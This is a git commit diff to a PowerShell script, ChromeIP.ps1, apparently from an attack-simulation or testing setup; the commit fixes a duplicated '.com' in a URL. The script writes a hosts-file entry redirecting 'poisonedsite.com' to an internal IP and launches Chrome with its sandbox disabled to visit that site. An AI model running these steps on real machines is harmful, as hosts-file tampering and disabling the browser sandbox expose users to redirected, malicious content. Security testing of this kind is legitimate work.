921f3a6fa98275477be6e893ebbc4ce3b43f2cee
aescobar-CRWD <53222444+aescobar-CRWD@users.noreply.github.com>
2021-04-29 16:17:26 +0100

    Update ChromeIP.ps1
    duplicated .com

--- ChromeIP.ps1
+++ ChromeIP.ps1
@@ -1,4 +1,4 @@
 Add-Content -Path $env:windir\System32\drivers\etc\hosts -Value "`n172.17.0.21`tpoisonedsite.com" -Force 
 $pathToChrome = 'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe'
-$url1 = "http://poisonedsite.com.com:8080"
+$url1 = "http://poisonedsite.com:8080"
 Start-Process -FilePath $pathToChrome -ArgumentList $url1, --no-sandbox
